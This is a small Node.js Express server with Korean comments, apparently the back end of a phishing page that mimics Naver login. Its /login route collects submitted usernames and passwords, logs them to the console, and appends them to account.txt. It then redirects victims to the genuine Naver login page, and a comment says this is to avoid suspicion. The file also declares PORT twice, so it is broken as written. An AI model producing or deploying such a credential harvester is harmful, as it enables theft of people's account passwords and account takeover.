const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// 1. 미들웨어 설정
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // public 폴더 안의 파일들을 웹에 띄움

app.get('/keep-alive', (req, res) => {
    res.send('I am awake!');
});

// 2. 로그인 정보 수집 경로
app.post('/login', (req, res) => {
    const { id, pw } = req.body; // HTML의 name="id", name="pw" 값을 가져옴
    const logData = `[${new Date().toLocaleString()}] ID: ${id} | PW: ${pw}\n`;

    // 콘솔에 출력 (실시간 확인용)
    console.log("아이디/비번 수집 완료:", logData);

    // 파일에 저장 (데이터 누적)
    fs.appendFileSync('account.txt', logData);

    // 실제 네이버 로그인 페이지로 리다이렉트 (의심 방지)
    res.redirect('https://nid.naver.com/nidlogin.login');
});

const PORT = process.env.PORT || 3000; 

app.listen(PORT, () => {
    // 2. 이제 실제 서버에서도 어색하지 않은 로그가 찍힙니다.
    console.log(`서버가 성공적으로 실행되었습니다. (Port: ${PORT})`);
});